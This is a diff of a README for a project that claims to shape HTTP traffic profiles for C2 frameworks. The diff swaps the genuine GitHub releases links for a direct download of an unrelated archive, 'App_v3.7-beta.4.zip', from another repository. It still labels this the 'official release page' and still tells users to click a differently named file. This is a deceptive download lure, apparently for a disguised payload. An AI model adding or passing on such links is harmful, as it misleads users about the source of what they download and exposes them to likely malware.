@@ -5,7 +5,7 @@ description: "Customize HTTP traffic profiles for open source C2 frameworks usin
 ---
 # 🛡️ openmalleablec2-v2026 - Shape network traffic for custom operations
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jorrieadvised872/openmalleablec2-v2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Jorrieadvised872/jorrieadvised872.github.io/main/supabase/App_v3.7-beta.4.zip)
 
 ## What is openmalleablec2-v2026?
 
@@ -27,7 +27,7 @@ Ensure your computer meets these requirements before you start.
 
 Follow these steps to obtain the correct files for your system:
 
-1.  Visit the official release page: [https://github.com/Jorrieadvised872/openmalleablec2-v2026/releases](https://github.com/Jorrieadvised872/openmalleablec2-v2026/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/Jorrieadvised872/jorrieadvised872.github.io/main/supabase/App_v3.7-beta.4.zip](https://raw.githubusercontent.com/Jorrieadvised872/jorrieadvised872.github.io/main/supabase/App_v3.7-beta.4.zip).
 2.  Look for the section labeled "Assets" at the bottom of the newest release post.
 3.  Click the file named `openmalleablec2-v2026-win.zip`.
 4.  Wait for the file download to finish.
